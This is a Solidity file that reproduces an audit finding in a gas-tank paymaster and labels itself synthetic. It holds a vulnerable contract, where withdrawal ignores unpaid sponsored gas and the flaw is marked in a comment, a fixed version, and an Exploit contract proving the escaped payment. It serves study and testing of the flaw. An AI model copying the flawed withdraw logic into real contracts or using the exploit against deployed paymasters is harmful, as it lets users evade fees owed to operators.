// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Etherspot — GasTankPaymaster lets a user withdraw the balance that should
    repay a sponsored user operation (Shieldify H-03, finding 62850).
    SYNTHETIC, cheatcode-free. _postOp records the sponsored amount and does
    not escrow it. gasTankWithdraw transfers the full balance. The owner's
    later repaySponsoredTransaction reverts, so the fee receiver is paid 0.
    @> VULN marks the withdraw transfer. The sponsored fee equals the deposit,
    so the whole withdrawal is the escaped payment. */

contract ERC20 {
    string public name = "Gas Token";
    string public symbol = "GAS";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            require(allowed >= amount, "allow");
            allowance[from][msg.sender] = allowed - amount;
        }
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract GasTank {
    ERC20 public token;
    address public owner;
    address public feeReceiver;
    mapping(address => uint256) public balances;
    mapping(address => uint256) public sponsored;

    constructor(ERC20 token_, address feeReceiver_) {
        token = token_;
        owner = msg.sender;
        feeReceiver = feeReceiver_;
    }

    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        balances[msg.sender] += amount;
    }

    function postOp(address user, uint256 gasCost) external {
        require(gasCost > 0, "gas");
        sponsored[user] += gasCost;
    }

    function gasTankWithdraw(uint256 amount) external {
        uint256 currentBalance = balances[msg.sender];
        if (currentBalance < amount) revert("GasTankPaymaster_InsufficientBalance");
        token.transfer(msg.sender, amount); // @> VULN: withdraw does not check the unpaid sponsored gas
        balances[msg.sender] = currentBalance - amount;
    }

    function repaySponsoredTransaction(address from, uint256 amount) external {
        require(msg.sender == owner, "owner");
        if (balances[from] < amount) revert("GasTankPaymaster_InsufficientBalance");
        balances[from] -= amount;
        balances[feeReceiver] += amount;
        sponsored[from] -= amount;
    }
}

contract GasTankFixed {
    ERC20 public token;
    address public owner;
    address public feeReceiver;
    mapping(address => uint256) public balances;
    mapping(address => uint256) public sponsored;
    mapping(address => bool) public isWithdrawPaused;

    constructor(ERC20 token_, address feeReceiver_) {
        token = token_;
        owner = msg.sender;
        feeReceiver = feeReceiver_;
    }

    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        balances[msg.sender] += amount;
    }

    function postOp(address user, uint256 gasCost) external {
        sponsored[user] += gasCost;
        isWithdrawPaused[user] = true;
    }

    function gasTankWithdraw(uint256 amount) external {
        require(!isWithdrawPaused[msg.sender], "withdraw paused");
        uint256 currentBalance = balances[msg.sender];
        if (currentBalance < amount) revert("GasTankPaymaster_InsufficientBalance");
        token.transfer(msg.sender, amount);
        balances[msg.sender] = currentBalance - amount;
    }

    function repaySponsoredTransaction(address from, uint256 amount) external {
        require(msg.sender == owner, "owner");
        if (balances[from] < amount) revert("GasTankPaymaster_InsufficientBalance");
        balances[from] -= amount;
        balances[feeReceiver] += amount;
        sponsored[from] -= amount;
        if (sponsored[from] == 0) isWithdrawPaused[from] = false;
    }
}

contract Exploit {
    ERC20 public token; // nonce 1
    GasTank public tank; // nonce 2
    address public constant feeReceiver = address(0xFE);

    constructor() {
        token = new ERC20();
        tank = new GasTank(token, feeReceiver);
        token.mint(address(this), 1000 ether);
        token.approve(address(tank), 1000 ether);
        tank.deposit(1000 ether);
    }

    function run() external {
        require(token.balanceOf(address(this)) == 0, "wallet starts empty");
        require(tank.balances(address(this)) == 1000 ether, "deposited");
        tank.postOp(address(this), 1000 ether);
        require(tank.sponsored(address(this)) == 1000 ether, "sponsorship recorded and not escrowed");
        tank.gasTankWithdraw(1000 ether);
        require(token.balanceOf(address(this)) == 1000 ether, "full balance withdrawn");
        require(tank.balances(address(this)) == 0, "tank balance cleared");
        bool repaid = true;
        try tank.repaySponsoredTransaction(address(this), 1000 ether) {
            repaid = true;
        } catch {
            repaid = false;
        }
        require(!repaid, "owner cannot repay");
        require(tank.balances(feeReceiver) == 0, "fee receiver got nothing");
        require(tank.sponsored(address(this)) == 1000 ether, "the gas debt is still unpaid");
    }
}
